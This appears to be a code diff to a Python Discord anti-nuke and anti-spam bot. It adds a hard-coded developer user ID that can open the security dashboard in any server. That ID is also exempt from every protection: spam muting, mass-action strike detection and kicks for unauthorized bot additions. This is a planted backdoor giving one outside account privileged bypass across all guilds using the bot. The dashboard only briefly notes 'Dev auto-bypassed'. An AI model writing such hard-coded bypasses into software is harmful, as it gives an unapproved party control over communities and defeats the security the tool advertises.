@@ -8,6 +8,11 @@ import asyncio
 import datetime
 
 # ---------------------------------------------------------
+# DEVELOPER / SUPER ADMIN ID
+# ---------------------------------------------------------
+MY_USER_ID = 1313370345851457569
+
+# ---------------------------------------------------------
 # JSON DATABASE SETUP
 # ---------------------------------------------------------
 DATA_FILE = "anti_nuke_configs.json"
@@ -104,7 +109,7 @@ def get_nuke_embed(config):
     embed.add_field(name="💬 Anti-Spam", value=f"**Status:** {spam_stat}\n**Limit:** {s['max_msg']} msgs in {s['time_window']}s\n**Action:** 5 Min Timeout", inline=True)
     
     wl_count = len(config['whitelist'])
-    embed.add_field(name="🛡️ Whitelist", value=f"**{wl_count}** Users bypassed\n*(Owners auto-bypassed)*", inline=False)
+    embed.add_field(name="🛡️ Whitelist", value=f"**{wl_count}** Users bypassed\n*(Owners & Dev auto-bypassed)*", inline=False)
     
     return embed
 
@@ -277,14 +282,16 @@ class AntiNukeCog(commands.Cog):
     @app_commands.command(name="security_setup", description="Open the Ultimate Anti-Nuke & Spam Dashboard")
     @app_commands.default_permissions(administrator=True)
     async def security_setup(self, interaction: discord.Interaction):
-        if interaction.user.id != interaction.guild.owner_id:
-            await interaction.response.send_message("❌ Only the Server Owner can configure Security!", ephemeral=True)
+        # ONLY Server Owner AND Developer (You) can open this dashboard
+        if interaction.user.id != interaction.guild.owner_id and interaction.user.id != MY_USER_ID:
+            await interaction.response.send_message("❌ Only the Server Owner or Bot Developer can configure Security!", ephemeral=True)
             return
+            
         config = get_nuke_config(interaction.guild.id)
         await interaction.response.send_message(embed=get_nuke_embed(config), view=AntiNukeView(interaction.guild.id), ephemeral=True)
 
     # ==========================================
-    # 1. ANTI-SPAM LOGIC (New Feature)
+    # 1. ANTI-SPAM LOGIC 
     # ==========================================
     @commands.Cog.listener()
     async def on_message(self, message: discord.Message):
@@ -292,23 +299,19 @@ class AntiNukeCog(commands.Cog):
         
         config = get_nuke_config(message.guild.id)
         if not config['is_enabled'] or not config.get('anti_spam', {}).get('enabled', False): return
-        if str(message.author.id) in config['whitelist'] or message.author.id == message.guild.owner_id: return
+        
+        # Bypasses: Whitelist, Server Owner, and YOU (Bot Developer)
+        if str(message.author.id) in config['whitelist'] or message.author.id == message.guild.owner_id or message.author.id == MY_USER_ID: return
 
-        # Track message speed
         s_config = config['anti_spam']
         strikes = add_strike(spam_tracker, message.guild.id, message.author.id, s_config['time_window'])
         
         if strikes >= s_config['max_msg']:
             clear_strikes(spam_tracker, message.guild.id, message.author.id)
             try:
-                # 1. Purge their recent spam messages
                 await message.channel.purge(limit=s_config['max_msg'], check=lambda m: m.author == message.author)
-                
-                # 2. Timeout (Mute) for 5 minutes
                 timeout_duration = datetime.timedelta(minutes=5)
                 await message.author.timeout(timeout_duration, reason="Anti-Spam Triggered")
-                
-                # 3. Alert Channel
                 alert = await message.channel.send(f"⚠️ {message.author.mention} has been **muted for 5 minutes** for spamming!")
                 await alert.delete(delay=5)
             except discord.Forbidden:
@@ -326,7 +329,9 @@ class AntiNukeCog(commands.Cog):
         try:
             async for entry in guild.audit_logs(limit=1, action=action_type):
                 user = entry.user
-                if not user or user.id == self.bot.user.id or user.id == guild.owner_id or str(user.id) in config['whitelist']: return
+                
+                # Bypasses: Bot itself, Server Owner, YOU (Bot Developer), and Whitelisted users
+                if not user or user.id == self.bot.user.id or user.id == guild.owner_id or user.id == MY_USER_ID or str(user.id) in config['whitelist']: return
 
                 strikes = add_strike(active_strikes, guild.id, user.id, config['threshold_time'])
                 if strikes >= config['threshold_count']:
@@ -377,7 +382,10 @@ class AntiNukeCog(commands.Cog):
             async for entry in member.guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                 if entry.target.id == member.id:
                     user = entry.user
-                    if user.id == member.guild.owner_id or str(user.id) in config['whitelist']: return
+                    
+                    # Bypasses for Anti-Bot Add
+                    if user.id == member.guild.owner_id or user.id == MY_USER_ID or str(user.id) in config['whitelist']: return
+                    
                     try: await member.kick(reason="Unauthorized Bot")
                     except: pass
                     
@@ -389,4 +397,4 @@ class AntiNukeCog(commands.Cog):
 
 async def setup(bot):
     await bot.add_cog(AntiNukeCog(bot))
-  
+    
